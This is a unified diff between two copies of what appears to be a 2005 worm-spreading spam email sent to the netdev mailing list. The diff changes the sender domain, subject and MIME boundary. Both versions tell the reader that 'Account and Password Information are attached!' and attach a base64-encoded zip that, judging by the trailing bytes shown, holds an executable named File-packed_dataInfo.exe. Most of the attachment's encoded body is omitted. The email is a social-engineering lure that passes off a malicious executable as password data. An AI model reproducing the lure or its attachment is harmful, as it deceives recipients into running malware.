@@ -1,26 +1,26 @@
-From: hostmaster@bk.ru
-Subject: Your Password
-Date: Thu, 08 Dec 2005 15:04:55 UTC
-Message-ID: <e18e3a45.9deeab13f@bk.ru>
+From: office@mail2yes.com
+Subject: Registration Confirmation
+Date: Thu, 08 Dec 2005 15:26:26 GMT
+Message-ID: <f73ad6.0c20f4497f@mail2yes.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===94dbd981b4deb"
+Content-Type: multipart/mixed; boundary="81b00afb8dcdea"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: zfreemailer@oss.sgi.com
+To: Z-Account@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---===94dbd981b4deb
+--81b00afb8dcdea
 
 Account and Password Information are attached!
 
 
-***** Go to: http://www.bk.ru
-***** Email: postman@bk.ru
---===94dbd981b4deb
+***** Go to: http://www.mail2yes.com
+***** Email: postman@mail2yes.com
+--81b00afb8dcdea
 Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass-data.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---===94dbd981b4deb--
+--81b00afb8dcdea--
